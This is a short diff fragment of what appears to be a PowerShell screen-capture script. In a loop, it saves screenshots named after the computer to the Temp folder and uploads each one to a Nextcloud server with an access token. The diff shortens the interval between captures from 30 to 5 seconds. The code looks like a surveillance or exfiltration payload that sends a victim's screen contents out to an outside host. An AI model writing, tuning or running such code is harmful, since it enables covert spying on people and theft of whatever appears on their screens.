@@ -156,7 +156,7 @@ while($i -lt 300){
   $bmp.Dispose()
   
   $i++
-  start-sleep -Seconds 30
+  start-sleep -Seconds 5
   $sourcePath = "$env:USERPROFILE\AppData\Local\Temp\$env:computername-Capture.png"
   Nextcloud-Upload -SourceFilePath $sourcePath -AccessToken $AccessToken
 }
